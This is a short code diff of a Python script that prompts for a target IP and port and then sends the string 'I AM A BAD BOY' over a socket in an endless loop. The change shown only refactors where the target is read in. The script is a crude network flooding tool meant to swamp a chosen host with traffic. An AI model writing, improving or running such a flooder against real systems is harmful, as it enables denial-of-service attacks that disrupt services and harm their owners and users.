@@ -2,7 +2,8 @@
 import socket
 import sys
 
-
+ip = input("Target IP: ")
+port =  input("Target Port: ")
 
 def send_traffic(ip, port):
 #     print(f"Sending burst to {ip}: + {str(port)}")
@@ -11,7 +12,7 @@ def send_traffic(ip, port):
      while True:
          sock.send("I AM A BAD BOY".encode('KOI8-R'))
 
-send_traffic(input("Target IP: "), input("Target Port: "))
+send_traffic(ip, port)
 
 
 
